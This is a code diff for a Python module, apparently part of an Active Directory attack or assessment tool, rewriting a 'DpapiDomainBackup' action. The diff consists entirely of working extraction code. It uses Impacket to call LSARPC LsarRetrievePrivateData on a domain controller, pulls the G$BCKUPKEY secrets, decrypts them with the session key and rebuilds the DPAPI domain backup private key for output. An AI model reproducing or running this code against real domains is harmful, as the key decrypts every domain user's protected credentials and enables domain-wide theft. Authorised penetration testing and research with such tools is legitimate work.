@@ -2,7 +2,6 @@
 
 from __future__ import annotations
 
-import contextlib
 import socket
 import struct
 from typing import Any
@@ -298,7 +297,8 @@ class DpapiDomainBackup:
         require_impacket("dpapi-domain-backup")
         if not target.has_credentials:
             raise RuntimeError("dpapi-domain-backup requires credentials with replication rights")
-        from impacket.examples.secretsdump import RemoteOperations
+        from impacket.dcerpc.v5 import lsad
+        from impacket.dcerpc.v5 import transport as dcerpc_transport
         from impacket.smbconnection import SMBConnection
 
         smb = SMBConnection(target.dc_ip, target.dc_ip)
@@ -318,29 +318,63 @@ class DpapiDomainBackup:
             smb.login(target.username or "", "", target.domain, lm, nt)
         else:
             smb.login(target.username or "", target.password or "", target.domain)
-        remote = RemoteOperations(smb, doKerberos=target.use_kerberos, kdcHost=target.dc_ip)
-        backup_key = None
+
+        backup_keys: list[str] = []
         error = None
+        rpc = dcerpc_transport.SMBTransport(target.dc_ip, filename=r"\lsarpc", smb_connection=smb)
         try:
-            getter = getattr(remote, "getDPAPI_DOMAIN_BACKUP_KEY", None) or getattr(
-                remote, "getDPAPIEncryptedHek", None
-            )
-            if getter:
-                backup_key = getter()
+            dce = rpc.get_dce_rpc()
+            dce.connect()
+            dce.bind(lsad.MSRPC_UUID_LSAD)
+            policy = lsad.hLsarOpenPolicy2(dce, lsad.POLICY_GET_PRIVATE_INFORMATION)
+            handle = policy["PolicyHandle"]
+            preferred = self._retrieve(dce, smb, handle, "G$BCKUPKEY_PREFERRED")
+            guid = self._bin_to_string(preferred)
+            secret = self._retrieve(dce, smb, handle, f"G$BCKUPKEY_{guid}")
+            key = self._parse_backup_key(secret)
+            if key is None:
+                version = struct.unpack("<I", secret[:4])[0]
+                error = f"unsupported DPAPI domain backup key version {version}"
             else:
-                error = (
-                    "RemoteOperations has no DPAPI domain backup-key helper in this Impacket build"
-                )
+                backup_keys.append(key.hex())
         except Exception as exc:  # noqa: BLE001
-            error = str(exc)
-        finally:
-            with contextlib.suppress(Exception):
-                remote.finish()
-        payload: dict[str, Any] = {"ok": backup_key is not None, "error": error}
-        if include_secrets and backup_key is not None:
-            payload["backup_key"] = (
-                backup_key.hex() if isinstance(backup_key, bytes) else str(backup_key)
-            )
-        elif backup_key is not None:
-            payload["backup_key_present"] = True
+            text = str(exc).lower()
+            if "access_denied" in text or "access denied" in text:
+                error = (
+                    "dpapi-domain-backup requires replication/backup-key privileges "
+                    "(LSARPC LsarRetrievePrivateData access denied)"
+                )
+            else:
+                error = str(exc)
+        payload: dict[str, Any] = {"ok": not error, "error": error}
+        if backup_keys and include_secrets:
+            payload["backup_keys"] = backup_keys
+        elif backup_keys:
+            payload["backup_keys_present"] = True
         return finish(session, graph, "dpapi-domain-backup", payload, ok=payload["ok"])
+
+    @staticmethod
+    def _retrieve(dce: Any, smb: Any, handle: Any, name: str) -> bytes:
+        from impacket.crypto import decryptSecret
+        from impacket.dcerpc.v5 import lsad
+
+        data = lsad.hLsarRetrievePrivateData(dce, handle, name)
+        return bytes(decryptSecret(smb.getSessionKey(), data))
+
+    @staticmethod
+    def _bin_to_string(raw: bytes) -> str:
+        d0, d1, d2 = struct.unpack("<IHH", raw[:8])
+        tail = raw[8:16]
+        return f"{d0:08x}-{d1:04x}-{d2:04x}-{tail[:2].hex()}-{tail[2:].hex()}"
+
+    @staticmethod
+    def _parse_backup_key(secret: bytes) -> bytes | None:
+        version = struct.unpack("<I", secret[:4])[0]
+        if version == 1:
+            return secret[4:]
+        if version == 2:
+            key_len, cert_len = struct.unpack("<II", secret[4:12])
+            data = secret[12 : 12 + key_len + cert_len]
+            pvk_header = struct.pack("<6I", 0xB0B5F11E, 0, 1, 0, 0, key_len)
+            return pvk_header + data[:key_len]
+        return None
